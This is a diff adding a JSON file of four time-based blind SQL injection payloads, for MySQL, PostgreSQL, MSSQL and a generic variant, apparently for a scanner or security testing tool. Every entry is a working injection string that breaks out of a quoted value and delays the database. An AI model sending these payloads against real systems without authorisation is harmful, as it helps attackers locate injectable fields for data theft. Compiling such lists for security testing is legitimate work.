@@ -1,0 +1,22 @@
+[
+  {
+    "name": "Time-Based SQLi (MySQL SLEEP 5)",
+    "payload": "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- ",
+    "db": "mysql"
+  },
+  {
+    "name": "Time-Based SQLi (PostgreSQL pg_sleep 5)",
+    "payload": "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
+    "db": "postgresql"
+  },
+  {
+    "name": "Time-Based SQLi (MSSQL WAITFOR 5)",
+    "payload": "' WAITFOR DELAY '0:0:5'--",
+    "db": "mssql"
+  },
+  {
+    "name": "Time-Based SQLi (Generic Blind)",
+    "payload": "' AND 1=BENCHMARK(10000000,MD5(1))--",
+    "db": "generic"
+  }
+]
